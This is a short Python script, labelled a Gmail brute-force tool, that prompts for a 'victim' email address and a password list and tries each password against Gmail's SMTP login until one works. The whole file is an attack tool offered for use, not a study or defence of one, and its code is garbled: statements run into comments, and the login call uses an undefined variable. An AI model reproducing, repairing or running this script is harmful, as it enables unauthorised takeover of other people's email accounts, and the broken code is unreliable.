'''Gmail Bruteforce Python Script@creator Swornim Shrestha@email srestaswrnm@gmail.comOct 19 2016 Wed 5:28 PM'''
import smtplib #importing smtp library

smtpserver = smtplib.SMTP("smtp.gmail.com",587) #initializationsmtpserver.ehlo() #Ehlo SMTP
smtpserver.starttls() #Starting TLS

user = input("Enter email address of victim  >") #Victims Email
passfile = input("input the password filename\n >>") #Passwords File
passwords = open(passfile,"r") #Opening the password file

#Foreach lines of password in input file
for password in passwords:
	try:#Trying to login and if the password matches.		
		smtpserver.login(username,password)#Then print the correct password.
		print("[+] Password found! %s" % password)break; #Break the loop
	except smtplib.SMTPAuthenticationError:# and if the password is wrong then.
		print("[!] Password Incorrect %s" % password)
